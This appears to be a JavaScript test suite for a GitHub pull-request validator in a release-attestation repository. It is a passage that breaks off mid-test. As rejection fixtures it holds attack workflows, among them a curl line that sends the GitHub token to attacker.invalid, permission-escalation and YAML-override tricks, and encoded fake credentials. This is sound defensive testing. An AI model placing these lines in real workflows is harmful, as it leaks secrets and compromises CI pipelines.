import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { validatePullRequestSnapshot } from "../scripts/lib/bury-p1-trusted-pr-validator.mjs";
import {
  collectPullRequestSnapshot,
  createGitHubApi,
  main,
  runTrustedPullRequestValidation,
} from "../scripts/validate-bury-p1-pull-request.mjs";

const repository = "AlexM999911/singingattitude-release-attestations";
const baseSha = "1".repeat(40);
const headSha = "2".repeat(40);

const trustedPolicy = {
  maxChangedFiles: 32,
  maxFileBytes: 64 * 1024,
  maxTotalBytes: 256 * 1024,
  protectedPaths: [
    ".github/workflows/bury-p1-trusted-pr-validation.yml",
    ".github/workflows/bury-p1-activation-probe.yml",
    "docs/bury-p1-required-workflow-ruleset.md",
    "policy/bury-p1-public-content-policy-v1.json",
    "scripts/validate-bury-p1-pull-request.mjs",
    "scripts/build-bury-p1-required-workflow-ruleset.mjs",
    "scripts/verify-bury-p1-required-workflow-ruleset.mjs",
    "scripts/validate-bury-p1-release-bundle.mjs",
    "scripts/consume-bury-p1-release.mjs",
    "scripts/run-bury-p1-activation-probe.mjs",
    "scripts/lib/bury-p1-trusted-pr-validator.mjs",
    "scripts/lib/bury-p1-release-runtime.mjs",
    "test/bury-p1-trusted-pr-validator.test.mjs",
    "test/bury-p1-release-runtime.test.mjs",
  ],
  allowedPathPatterns: [
    "^README\\.md$",
    "^SECURITY\\.md$",
    "^schemas/bury-p1-[a-z0-9-]+-v1\\.schema\\.json$",
    "^\\.github/workflows/bury-p1-(?:manifest-validation|native-attestation|one-use-consumption)\\.yml$",
  ],
  reservedWorkflowPaths: [
    ".github/workflows/bury-p1-manifest-validation.yml",
    ".github/workflows/bury-p1-native-attestation.yml",
    ".github/workflows/bury-p1-one-use-consumption.yml",
  ],
  approvedWorkflowContracts: {},
  approvedJsonContracts: {},
};

const repositoryPolicyPath = new URL(
  "../policy/bury-p1-public-content-policy-v1.json",
  import.meta.url,
);
const trustedWorkflowPath = new URL(
  "../.github/workflows/bury-p1-trusted-pr-validation.yml",
  import.meta.url,
);

function blob(content) {
  return {
    encoding: "base64",
    content: Buffer.from(content, "utf8").toString("base64"),
    size: Buffer.byteLength(content),
  };
}

function semanticWorkflowContract(overrides = {}) {
  return {
    allowedTriggers: ["push"],
    allowedRunCommands: [],
    allowedActions: [
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
    ],
    allowedTopLevelKeys: ["name", "on", "permissions", "jobs"],
    allowedJobKeys: ["name", "runs-on", "timeout-minutes", "permissions", "steps"],
    allowedStepKeys: ["name", "uses", "with"],
    allowedWithKeys: ["persist-credentials"],
    exactActionInputs: {
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683": { "persist-credentials": "false" },
    },
    exactEnvironmentEntries: {},
    exactRunConditions: {},
    requiredActionCounts: {
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683": 1,
    },
    requiredRunCounts: {},
    allowedPermissionEntries: ["contents:read"],
    requiredEnvironment: false,
    requiredJobKeys: ["name", "runs-on", "timeout-minutes", "steps"],
    requiredPermissionEntries: ["contents:read"],
    ...overrides,
  };
}

function safeWorkflow({ actions, permissions, triggers, environment, contract }) {
  const permissionLines = permissions.map((value) => `      ${value.replace(":", ": ")}`).join("\n");
  const actionStep = (action, index) => {
    const inputs = contract?.exactActionInputs?.[action] ?? (action.startsWith("actions/checkout")
      ? { "persist-credentials": "false" }
      : { "subject-path": "manifests/bury-p1-reviewed.json", "push-to-registry": "false", "show-summary": "false" });
    const withBlock = Object.entries(inputs).map(([key, value]) => `          ${key}: ${value}`).join("\n");
    return `      - name: safe action ${index + 1}\n        uses: ${action}\n        with:\n${withBlock}`;
  };
  const runStep = (command, index) => `      - name: protected runtime ${index + 1}\n${contract?.exactRunConditions?.[command] ? `        if: ${contract.exactRunConditions[command]}\n` : ""}        run: ${command}`;
  let stepLines;
  if (contract?.allowedRunCommands?.length === 2) {
    stepLines = [actionStep(actions[0], 0), runStep(contract.allowedRunCommands[0], 0), actionStep(actions[1], 1), runStep(contract.allowedRunCommands[1], 1)];
  } else if (contract?.allowedRunCommands?.length === 1 && actions.length === 2) {
    stepLines = [actionStep(actions[0], 0), runStep(contract.allowedRunCommands[0], 0), actionStep(actions[1], 1)];
  } else {
    stepLines = [...actions.map(actionStep), ...(contract?.allowedRunCommands ?? []).map(runStep)];
  }
  const actionLines = stepLines.join("\n");
  const environmentLine = environment ? "    environment: bury-p1-attestation\n" : "";
  const envEntries = Object.entries(contract?.exactEnvironmentEntries ?? {});
  const envBlock = envEntries.length ? `    env:\n${envEntries.map(([key, value]) => `      ${key}: ${value}`).join("\n")}\n` : "";
  return `name: Safe Bury P1 workflow\non:\n${triggers.map((value) => `  ${value}:`).join("\n")}\npermissions: {}\njobs:\n  safe-job:\n    name: safe-job\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n${environmentLine}${envBlock}    permissions:\n${permissionLines}\n    steps:\n${actionLines}\n`;
}

function safeSchema(contract) {
  const closedObject = (nested) => ({
    type: "object",
    additionalProperties: false,
    required: Object.keys(nested),
    properties: nested,
  });
  const ref = (name) => ({ $ref: `#/$defs/${name}` });
  const properties = Object.fromEntries(
    contract.requiredRootProperties.map((key) => [key, { type: "string" }]),
  );
  const defs = {
    sha256: { type: "string", pattern: "^[0-9a-f]{64}$" },
    gitSha: { type: "string", pattern: "^[0-9a-f]{40}$" },
    canonicalUtc: {
      type: "string",
      pattern: "^[0-9]{4}-(0[1-9]|1[0-2])-([0-2][0-9]|3[01])T([01][0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9]Z$",
    },
  };
  if (["attestation-manifest", "consumption-claim"].includes(contract.schemaProfile)) {
    defs.window = closedObject({ startsAtUtc: ref("canonicalUtc"), expiresAtUtc: ref("canonicalUtc") });
  }
  if (contract.schemaProfile === "attestation-manifest") {
    Object.assign(properties, {
      schemaVersion: { const: "bury-p1-attestation-manifest-v1" },
      recordId: { type: "string", pattern: "^BURY-P1-[A-Z0-9-]{8,120}$" },
      trustModel: { const: "BURY-P1-MODE-A-GITHUB-ATTESTATION-WITH-EXTERNAL-HUMAN-APPROVALS-V1" },
      repository: { const: repository },
      authorization: closedObject({
        authorizationId: { type: "string", pattern: "^BURY-P1-[A-Z0-9-]{8,120}$" },
        oneUse: { const: true }, p1Authorized: { const: true }, g2Authorized: { const: false },
      }),
      candidate: closedObject({
        commit: ref("gitSha"), tree: ref("gitSha"), pathListSha256: ref("sha256"),
        contentLedgerSha256: ref("sha256"), completeBundleSha256: ref("sha256"), migrationLedgerSha256: ref("sha256"),
      }),
      target: closedObject({
        profile: { const: "isolated-localhost-disposable-v1" },
        reference: { type: "string", pattern: "^local-supabase://[a-z0-9-]{8,96}$" },
        nonProduction: { const: true }, noCustomerData: { const: true }, exclusiveLocalhost: { const: true },
      }),
      executionWindow: ref("window"),
      migrations: {
        type: "array", minItems: 1, maxItems: 16,
        items: closedObject({
          order: { type: "integer", minimum: 1, maximum: 16 },
          path: { type: "string", pattern: "^(tests/sql/bury-acuity-authority/00_baseline\\.sql|supabase/migrations/[0-9]{14}_[a-z0-9_]+\\.sql)$" },
          sha256: ref("sha256"),
        }),
      },
      approvals: { type: "array", minItems: 2, maxItems: 2, items: closedObject({ authorityRole: { enum: ["business-release-owner", "independent-qa-reviewer"] }, sha256: ref("sha256") }) },
      actors: closedObject({
        repositoryExecutor: closedObject({
          githubLogin: { type: "string", pattern: "^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$" },
          githubAccountId: { type: "string", pattern: "^[1-9][0-9]{0,19}$" },
        }),
        businessReleaseEvidenceReference: { type: "string", pattern: "^BURY-[A-Z0-9][A-Z0-9/._:-]{7,200}$" },
        independentQaEvidenceReference: { type: "string", pattern: "^BURY-[A-Z0-9][A-Z0-9/._:-]{7,200}$" },
      }),
      boundaries: closedObject(Object.fromEntries(
        ["production", "providers", "payments", "email", "deployment", "publicBooking", "g2"].map((key) => [key, { const: false }]),
      )),
    });
  } else if (contract.schemaProfile === "consumption-claim") {
    Object.assign(properties, {
      schemaVersion: { const: "bury-p1-consumption-claim-v1" },
      authorizationId: { type: "string", pattern: "^BURY-P1-[A-Z0-9-]{8,120}$" },
      repository: { const: repository },
      claimTag: { type: "string", pattern: "^bury-p1-consumed/BURY-P1-[A-Z0-9-]{8,120}$" },
      manifestSha256: ref("sha256"), attestationBundleSha256: ref("sha256"), candidateCommit: ref("gitSha"),
      businessApprovalSha256: ref("sha256"), qaReceiptSha256: ref("sha256"), executionWindow: ref("window"),
      workflowRun: closedObject({
        repository: { const: repository }, workflow: { const: ".github/workflows/bury-p1-one-use-consumption.yml" },
        ref: { const: "refs/heads/main" }, sha: ref("gitSha"),
        runId: { type: "string", pattern: "^[1-9][0-9]{0,19}$" },
        runAttempt: { type: "string", pattern: "^[1-9][0-9]{0,9}$" },
        actor: { type: "string", pattern: "^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$" },
        actorId: { type: "string", pattern: "^[1-9][0-9]{0,19}$" },
      }),
      oneUse: { const: true }, p1Authorized: { const: true }, g2Authorized: { const: false }, issuedAtUtc: ref("canonicalUtc"),
    });
  } else if (contract.schemaProfile === "external-approval-reference") {
    Object.assign(properties, {
      schemaVersion: { const: "bury-p1-external-approval-reference-v1" },
      authorityRole: { enum: ["business-release-owner", "independent-qa-reviewer"] },
      decision: { enum: ["APPROVED", "PASS"] },
      evidenceReference: { type: "string", pattern: "^BURY-[A-Z0-9][A-Z0-9/._:-]{7,200}$" },
      evidenceSha256: ref("sha256"), acceptedAtUtc: ref("canonicalUtc"), validUntilUtc: ref("canonicalUtc"),
      subjectCommit: ref("gitSha"), subjectCandidateLedgerSha256: ref("sha256"), authorityGrants: { type: "array", maxItems: 0 },
    });
  } else if (contract.schemaProfile === "verification-receipt") {
    Object.assign(properties, {
      schemaVersion: { const: "bury-p1-verification-receipt-v1" },
      recordId: { type: "string", pattern: "^BURY-P1-[A-Z0-9-]{8,120}$" }, result: { const: "PASS" },
      verifiedAtUtc: ref("canonicalUtc"), repository: { const: repository }, candidateCommit: ref("gitSha"),
      manifestSha256: ref("sha256"), attestationBundleSha256: ref("sha256"), businessApprovalSha256: ref("sha256"), qaReceiptSha256: ref("sha256"),
      claim: closedObject({ tag: { type: "string", pattern: "^bury-p1-consumed/BURY-P1-[A-Z0-9-]{8,120}$" }, claimSha256: ref("sha256") }),
      finalizerWorkflowRun: closedObject({
        repository: { const: repository }, workflow: { const: ".github/workflows/bury-p1-one-use-consumption.yml" }, ref: { const: "refs/heads/main" },
        sha: ref("gitSha"), runId: { type: "string", pattern: "^[1-9][0-9]{0,19}$" }, runAttempt: { type: "string", pattern: "^[1-9][0-9]{0,9}$" },
        actor: { type: "string", pattern: "^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$" }, actorId: { type: "string", pattern: "^[1-9][0-9]{0,19}$" },
      }),
      authorityGrants: { type: "array", maxItems: 0 },
    });
  }
  if (contract.requiredTrueCheckProperties.length > 0) {
    properties.checks = closedObject(
      Object.fromEntries(
        contract.requiredTrueCheckProperties.map((key) => [key, { const: true }]),
      ),
    );
  }
  return `${JSON.stringify({
    $schema: "https://json-schema.org/draft/2020-12/schema",
    $id: contract.schemaId,
    title: "Closed Bury P1 schema",
    type: "object",
    additionalProperties: false,
    required: contract.requiredRootProperties,
    properties,
    $defs: defs,
  })}\n`;
}

function snapshotFor(files) {
  const treeEntries = [];
  const blobs = {};
  const compareFiles = [];

  for (const [index, file] of files.entries()) {
    const sha = String(index + 3).repeat(40).slice(0, 40);
    const content = file.content ?? "{}\n";
    treeEntries.push({
      path: file.path,
      mode: file.mode ?? "100644",
      type: file.type ?? "blob",
      sha,
      size: file.size ?? Buffer.byteLength(content),
    });
    compareFiles.push({
      filename: file.path,
      status: file.status ?? "added",
      sha,
    });
    if ((file.status ?? "added") !== "removed" && (file.type ?? "blob") === "blob") {
      blobs[sha] = file.blob ?? blob(content);
    }
  }

  return {
    expectedRepository: repository,
    event: {
      repository: { full_name: repository },
      pull_request: {
        base: { ref: "main", sha: baseSha, repo: { full_name: repository } },
        head: { sha: headSha, repo: { full_name: repository } },
        changed_files: compareFiles.length,
      },
    },
    compare: { files: compareFiles },
    headCommit: { sha: headSha, tree: { sha: "9".repeat(40) } },
    tree: { truncated: false, tree: treeEntries },
    blobs,
    policy: trustedPolicy,
  };
}

test("exports the trusted pull-request validator", async () => {
  const validatorModule = await import(
    "../scripts/lib/bury-p1-trusted-pr-validator.mjs"
  ).catch(() => ({}));

  assert.equal(
    typeof validatorModule.validatePullRequestSnapshot,
    "function",
    "the protected repository must provide its own validator",
  );
});

test("exports the GitHub API snapshot collector", async () => {
  const runnerModule = await import(
    "../scripts/validate-bury-p1-pull-request.mjs"
  ).catch(() => ({}));

  assert.equal(
    typeof runnerModule.collectPullRequestSnapshot,
    "function",
    "the base-owned runner must collect PR bytes without checking them out",
  );
});

test("exports the trusted validation runner", async () => {
  const runnerModule = await import(
    "../scripts/validate-bury-p1-pull-request.mjs"
  );

  assert.equal(
    typeof runnerModule.runTrustedPullRequestValidation,
    "function",
  );
});

test("exports a fixed-origin GitHub API client", async () => {
  const runnerModule = await import(
    "../scripts/validate-bury-p1-pull-request.mjs"
  );

  assert.equal(typeof runnerModule.createGitHubApi, "function");
});

test("exports the protected-base CLI entrypoint", async () => {
  const runnerModule = await import(
    "../scripts/validate-bury-p1-pull-request.mjs"
  );

  assert.equal(typeof runnerModule.main, "function");
});

test("GitHub API client performs authenticated JSON GETs only against api.github.com", async () => {
  const requests = [];
  const api = createGitHubApi({
    token: "test-token-never-logged",
    fetchFn: async (url, options) => {
      requests.push({ url, options });
      return { ok: true, status: 200, json: async () => ({ value: "safe" }) };
    },
  });

  assert.deepEqual(await api("/repos/owner/repo/git/commits/abc"), {
    value: "safe",
  });
  assert.equal(requests[0].url, "https://api.github.com/repos/owner/repo/git/commits/abc");
  assert.equal(requests[0].options.method, "GET");
  assert.equal(requests[0].options.headers.authorization, "Bearer test-token-never-logged");
  assert.match(requests[0].options.headers.accept, /github\+json/);
  await assert.rejects(api("https://attacker.invalid/payload"), /relative GitHub API path/i);
  assert.equal(requests.length, 1);
});

test("CLI refuses a workflow/base SHA mismatch before any GitHub object read", async () => {
  const value = snapshotFor([{ path: "README.md", content: "Safe\n" }]);
  value.event.pull_request.number = 10;
  let apiCalls = 0;

  await assert.rejects(
    main({
      env: {
        EXPECTED_REPOSITORY: repository,
        GITHUB_EVENT_PATH: "/github/event.json",
        TRUSTED_BASE_SHA: "7".repeat(40),
      },
      readFileFn: (path) =>
        String(path).includes("event.json")
          ? JSON.stringify(value.event)
          : JSON.stringify({ trustedPullRequestValidation: trustedPolicy }),
      api: async () => {
        apiCalls += 1;
        return {};
      },
    }),
    /protected base SHA/i,
  );
  assert.equal(apiCalls, 0);
});

test("collects PR files, the head tree, and blobs only through inert GitHub API reads", async () => {
  const expected = snapshotFor([
    {
      path: "schemas/bury-p1-attestation-manifest-v1.schema.json",
      content: '{"type":"object"}\n',
    },
  ]);
  expected.event.pull_request.number = 7;
  const calls = [];
  const api = async (path) => {
    calls.push(path);
    const routes = new Map([
      [
        `/repos/${repository}/pulls/7/files?per_page=100&page=1`,
        expected.compare.files,
      ],
      [
        `/repos/${repository}/git/commits/${headSha}`,
        expected.headCommit,
      ],
      [
        `/repos/${repository}/git/trees/${expected.headCommit.tree.sha}?recursive=1`,
        expected.tree,
      ],
      [
        `/repos/${repository}/git/blobs/${expected.compare.files[0].sha}`,
        expected.blobs[expected.compare.files[0].sha],
      ],
    ]);
    assert.equal(routes.has(path), true, `unexpected API route: ${path}`);
    return routes.get(path);
  };

  const result = await collectPullRequestSnapshot({
    api,
    event: expected.event,
    expectedRepository: repository,
    policy: trustedPolicy,
  });

  assert.deepEqual(result, expected);
  assert.deepEqual(calls, [
    `/repos/${repository}/pulls/7/files?per_page=100&page=1`,
    `/repos/${repository}/git/commits/${headSha}`,
    `/repos/${repository}/git/trees/${expected.headCommit.tree.sha}?recursive=1`,
    `/repos/${repository}/git/blobs/${expected.compare.files[0].sha}`,
  ]);
});

test("refuses oversized PR metadata before fetching attacker-controlled objects", async () => {
  const value = snapshotFor([{ path: "README.md", content: "Safe\n" }]);
  value.event.pull_request.number = 8;
  value.event.pull_request.changed_files = trustedPolicy.maxChangedFiles + 1;
  let calls = 0;

  await assert.rejects(
    collectPullRequestSnapshot({
      api: async () => {
        calls += 1;
        return {};
      },
      event: value.event,
      expectedRepository: repository,
      policy: trustedPolicy,
    }),
    /changed-file limit/i,
  );
  assert.equal(calls, 0);
});

test("does not download a head blob whose Git tree size already exceeds policy", async () => {
  const expected = snapshotFor([
    {
      path: "README.md",
      content: "small fixture",
      size: trustedPolicy.maxFileBytes + 1,
    },
  ]);
  expected.event.pull_request.number = 11;
  let blobCalls = 0;
  const api = async (path) => {
    if (path.includes("/pulls/11/files")) return expected.compare.files;
    if (path.includes("/git/commits/")) return expected.headCommit;
    if (path.includes("/git/trees/")) return expected.tree;
    if (path.includes("/git/blobs/")) {
      blobCalls += 1;
      return expected.blobs[expected.compare.files[0].sha];
    }
    throw new Error(`unexpected API route: ${path}`);
  };

  const snapshot = await collectPullRequestSnapshot({
    api,
    event: expected.event,
    expectedRepository: repository,
    policy: trustedPolicy,
  });

  assert.equal(blobCalls, 0);
  assert.equal(validatePullRequestSnapshot(snapshot).ok, false);
});

test("runner fails closed when the API-fetched PR changes its own validator", async () => {
  const expected = snapshotFor([
    {
      path: "scripts/lib/bury-p1-trusted-pr-validator.mjs",
      status: "modified",
      content: "export function validatePullRequestSnapshot() { return { ok: true, errors: [] }; }\n",
    },
  ]);
  expected.event.pull_request.number = 9;
  const api = async (path) => {
    if (path.includes("/pulls/9/files")) return expected.compare.files;
    if (path.includes("/git/commits/")) return expected.headCommit;
    if (path.includes("/git/trees/")) return expected.tree;
    if (path.includes("/git/blobs/")) {
      return expected.blobs[expected.compare.files[0].sha];
    }
    throw new Error(`unexpected API route: ${path}`);
  };

  await assert.rejects(
    runTrustedPullRequestValidation({
      api,
      event: expected.event,
      expectedRepository: repository,
      policy: trustedPolicy,
    }),
    /trusted baseline/i,
  );
});

test("repository policy authorises only the trusted PR validator exception", () => {
  const policy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));

  assert.equal(
    policy.authority.trustedPullRequestValidatorImplementationAuthorised,
    true,
  );
  assert.equal(policy.authority.workflowImplementationAuthorised, true);
  assert.equal(
    policy.futureNativeAttestationContract.implementationStatus,
    "AUTHORISED_PROTECTED_RUNTIME_CONTRACT",
  );
  assert.equal(
    policy.futureNativeAttestationContract.pullRequestTargetProhibited,
    true,
  );
  assert.equal(
    policy.trustedPullRequestValidation.pullRequestTargetRequired,
    true,
  );
  assert.equal(
    policy.trustedPullRequestValidation.protectedBaseCodeOnly,
    true,
  );
  assert.deepEqual(
    policy.trustedPullRequestValidation.protectedPaths,
    trustedPolicy.protectedPaths,
  );
  assert.equal(
    policy.trustedPullRequestValidation.requiredWorkflowEnforcement.implementationStatus,
    "BLOCKED_UNTIL_POST_MERGE_ACTIVE_RULESET_READBACK",
  );
  assert.equal(
    policy.trustedPullRequestValidation.requiredWorkflowEnforcement.genericStatusContextProhibited,
    true,
  );
});

test("workflow executes only the protected-base validator with read-only permissions", () => {
  let workflow = "";
  try {
    workflow = readFileSync(trustedWorkflowPath, "utf8");
  } catch {
    // The first TDD run must fail as an assertion while the workflow is absent.
  }

  assert.match(workflow, /pull_request_target:/);
  assert.match(workflow, /branches:\s*\[main\]/);
  assert.match(workflow, /permissions:\s*\{\}/);
  assert.match(workflow, /validate-trusted-bury-p1-policy:[\s\S]*?permissions:[\s\S]*?contents:\s*read[\s\S]*?pull-requests:\s*read/);
  assert.doesNotMatch(workflow, /statuses:\s*write/);
  assert.doesNotMatch(workflow, /(?:contents|pull-requests|actions|checks):\s*write/);
  assert.doesNotMatch(workflow, /id-token:\s*write/);
  assert.match(
    workflow,
    /uses:\s*actions\/checkout@11bd71901bbe5b1630ceea73d27597364c9af683/,
  );
  assert.match(
    workflow,
    /ref:\s*\$\{\{\s*github\.event\.pull_request\.base\.sha\s*\}\}/,
  );
  assert.match(workflow, /persist-credentials:\s*false/);
  assert.match(
    workflow,
    /node trusted-base\/scripts\/validate-bury-p1-pull-request\.mjs/,
  );
  assert.doesNotMatch(
    workflow,
    /ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.sha\s*\}\}/,
  );
  assert.doesNotMatch(workflow, /publish-bury-p1-validation-status/);
});

test("accepts a same-repository bootstrap containing only approved inert artifacts", () => {
  const result = validatePullRequestSnapshot(
    snapshotFor([{ path: "README.md", content: "Bury P1 public bootstrap documentation.\n" }]),
  );

  assert.deepEqual(result, { ok: true, errors: [] });
});

test("rejects workflows outside their immutable path-specific semantic contracts", () => {
  const path = ".github/workflows/bury-p1-native-attestation.yml";
  const attacks = [
    "name: attack\non:\n  pull_request_target:\njobs:\n  attack:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid/?token=${{ github.token }}\n",
    "name: attack\non: push\npermissions:\n  contents: write\njobs:\n  attack:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./local-action\n",
    "name: attack\non: push\njobs:\n  attack:\n    runs-on: ubuntu-latest\n    steps:\n      - \\u0075ses: docker://alpine:latest\n",
    "name: attack\nbase: &base\n  permissions:\n    contents: write\njobs:\n  attack:\n    <<: *base\n",
    "name: attack\non:\n  push:\njobs:\n  attack:\n    runs-on: ubuntu-24.04\n    steps:\n      - name: omitted permission boundary\n        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n",
    "name: attack\non:\n  push:\npermissions:\n  contents: read\npermissions:\n  contents: write\njobs:\n  attack:\n    runs-on: ubuntu-24.04\n    steps:\n      - name: duplicate key override\n        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n",
  ];

  for (const content of attacks) {
    const value = snapshotFor([{ path, content }]);
    value.policy = {
      ...trustedPolicy,
      approvedWorkflowContracts: {
        [path]: {
          ...semanticWorkflowContract({ allowedActions: [] }),
        },
      },
    };
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, content);
    assert.match(result.errors.join("\n"), /contract|duplicate|permission|expression|action|YAML|pull_request_target/i);
  }

  const safe = "name: Manifest validation\non:\n  push:\npermissions:\n  contents: read\njobs:\n  validate:\n    name: validate\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - name: checkout\n        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n        with:\n          persist-credentials: false\n";
  const uncontracted = validatePullRequestSnapshot(snapshotFor([{ path, content: safe }]));
  assert.equal(uncontracted.ok, false);
  assert.match(uncontracted.errors.join("\n"), /not explicitly base-authorized/i);

  const value = snapshotFor([{ path, content: safe }]);
  value.policy = {
    ...trustedPolicy,
    approvedWorkflowContracts: {
      [path]: {
        ...semanticWorkflowContract(),
      },
    },
  };
  assert.deepEqual(validatePullRequestSnapshot(value), { ok: true, errors: [] });

  const changed = snapshotFor([{ path, content: `${safe}# PR-controlled mutation\n` }]);
  changed.policy = value.policy;
  assert.equal(validatePullRequestSnapshot(changed).ok, false);
});

test("requires path-specific closed JSON contracts and rejects encoded custom credentials", () => {
  const path = "schemas/bury-p1-attestation-manifest-v1.schema.json";
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const contract = repositoryPolicy.trustedPullRequestValidation.approvedJsonContracts[path];
  const safe = safeSchema(contract);
  const safeValue = snapshotFor([{ path, content: safe }]);
  safeValue.policy = {
    ...trustedPolicy,
    approvedJsonContracts: {
      [path]: {
        ...contract,
      },
    },
  };
  assert.deepEqual(validatePullRequestSnapshot(safeValue), { ok: true, errors: [] });

  const uncontracted = snapshotFor([{ path, content: safe }]);
  assert.equal(validatePullRequestSnapshot(uncontracted).ok, false);

  const credential = Buffer.from("custom-signing-credential-value-1234567890").toString("base64");
  const maliciousObject = JSON.parse(safe);
  maliciousObject.properties.schemaVersion.description = credential;
  const malicious = `${JSON.stringify(maliciousObject)}\n`;
  const maliciousValue = snapshotFor([{ path, content: malicious }]);
  maliciousValue.policy = {
    ...trustedPolicy,
    approvedJsonContracts: {
      [path]: {
        ...contract,
      },
    },
  };
  const result = validatePullRequestSnapshot(maliciousValue);
  assert.equal(result.ok, false);
  assert.match(result.errors.join("\n"), /encoded|entropy|credential|sensitive/i);
});

test("rejects a verification receipt schema with optional claims or non-true checks", () => {
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const policy = repositoryPolicy.trustedPullRequestValidation;
  const path = "schemas/bury-p1-verification-receipt-v1.schema.json";
  const contract = policy.approvedJsonContracts[path];
  const schema = JSON.parse(safeSchema(contract));
  schema.required = schema.required.filter((key) => key !== "claim");
  schema.properties.checks.properties.repositoryIdentity = { type: "boolean" };
  const result = validatePullRequestSnapshot(
    Object.assign(snapshotFor([{ path, content: `${JSON.stringify(schema)}\n` }]), { policy }),
  );
  assert.equal(result.ok, false);
  assert.match(result.errors.join("\n"), /root|fail-open|const true/i);
});

test("accepts corrected semantic fixtures at all three workflow and four schema paths", () => {
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const policy = repositoryPolicy.trustedPullRequestValidation;
  const files = [];
  for (const [path, contract] of Object.entries(policy.approvedWorkflowContracts)) {
    files.push({
      path,
      content: readFileSync(new URL(`../test/fixtures/bury-p1-corrected/${path}`, import.meta.url), "utf8"),
    });
  }
  for (const [path, contract] of Object.entries(policy.approvedJsonContracts)) {
    files.push({ path, content: safeSchema(contract) });
  }
  const value = snapshotFor(files);
  value.policy = policy;
  assert.equal(files.length, 7);
  assert.deepEqual(validatePullRequestSnapshot(value), { ok: true, errors: [] });
});

test("requires the protected environment, checkout credential isolation, and traversal-safe subjects", () => {
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const policy = repositoryPolicy.trustedPullRequestValidation;
  const path = ".github/workflows/bury-p1-native-attestation.yml";
  const contract = policy.approvedWorkflowContracts[path];
  const safe = safeWorkflow({
    actions: contract.allowedActions,
    permissions: contract.requiredPermissionEntries,
    triggers: contract.allowedTriggers,
    environment: true,
    contract,
  });
  const cases = [
    safe.replace("    environment: bury-p1-attestation\n", ""),
    safe.replace("          persist-credentials: false\n", ""),
    safe.replace("manifests/bury-p1-reviewed.json", "manifests/../policy/bury-p1-public-content-policy-v1.json"),
  ];
  for (const content of cases) {
    const value = snapshotFor([{ path, content }]);
    value.policy = policy;
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, content);
    assert.match(result.errors.join("\n"), /environment|credential|subject|travers/i);
  }
});

test("rejects empty property schemas at every approved schema path", () => {
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const policy = repositoryPolicy.trustedPullRequestValidation;
  for (const [path, contract] of Object.entries(policy.approvedJsonContracts)) {
    const schema = JSON.parse(safeSchema(contract));
    for (const key of contract.requiredRootProperties) schema.properties[key] = {};
    const value = snapshotFor([{ path, content: `${JSON.stringify(schema)}\n` }]);
    value.policy = policy;
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, path);
    assert.match(result.errors.join("\n"), /schema|semantic|property|type|const|format|fail-open/i, path);
  }
});

test("rejects semantic weakening of identities, authorization locks, hashes, and grants", () => {
  const repositoryPolicy = JSON.parse(readFileSync(repositoryPolicyPath, "utf8"));
  const policy = repositoryPolicy.trustedPullRequestValidation;
  const cases = [
    ["schemas/bury-p1-attestation-manifest-v1.schema.json", (schema) => {
      schema.properties.repository = { type: "string" };
    }],
    ["schemas/bury-p1-consumption-claim-v1.schema.json", (schema) => {
      schema.properties.g2Authorized = { const: true };
    }],
    ["schemas/bury-p1-external-approval-reference-v1.schema.json", (schema) => {
      schema.properties.authorityGrants.maxItems = 1;
    }],
    ["schemas/bury-p1-verification-receipt-v1.schema.json", (schema) => {
      schema.properties.candidateCommit = { type: "string" };
    }],
  ];
  for (const [path, mutate] of cases) {
    const schema = JSON.parse(safeSchema(policy.approvedJsonContracts[path]));
    mutate(schema);
    const value = snapshotFor([{ path, content: `${JSON.stringify(schema)}\n` }]);
    value.policy = policy;
    const result = validatePullRequestSnapshot(value);
    assert.equal(result.ok, false, path);
    assert.match(result.errors.join("\n"), /semantic|unsafe|contract|format/i, path);
  }
});

test("rejects a base64-encoded credential in otherwise allowed public text", () => {
  const credential = `${"ghp_"}${"a".repeat(36)}`;
  const encoded = Buffer.from(credential, "utf8").toString("base64");
  const result = validatePullRequestSnapshot(
    snapshotFor([{ path: "README.md", content: `Public evidence: ${encoded}\n` }]),
  );
  assert.equal(result.ok, false);
  assert.match(result.errors.join("\n"), /encoded|credential|sensitive|secret/i);

  const opaqueSecret = Buffer.from("A9fK2mQ7xR4vN8zL3pT6wY1cD5gH0jS2uV7bE4nM", "utf8").toString("base64");
  const opaqueResult = validatePullRequestSnapshot(
    snapshotFor([{ path: "SECURITY.md", content: `Opaque value: ${opaqueSecret}\n` }]),
  );
  assert.equal(opaqueResult.ok, false);
  assert.match(opaqueResult.errors.join("\n"), /encoded|entropy|sensitive|secret/i);

  const hexEncoded = Buffer.from(credential, "utf8").toString("hex");
  const hexResult = validatePullRequestSnapshot(
    snapshotFor([{ path: "README.md", content: `Hex evidence: ${hexEncoded}\n` }]),
  );
  assert.equal(hexResult.ok, false);
  assert.match(hexResult.errors.join("\n"), /encoded|credential|sensitive|secret/i);

  const hashes = `${"a".repeat(40)} ${"b".repeat(64)}\n`;
  assert.deepEqual(
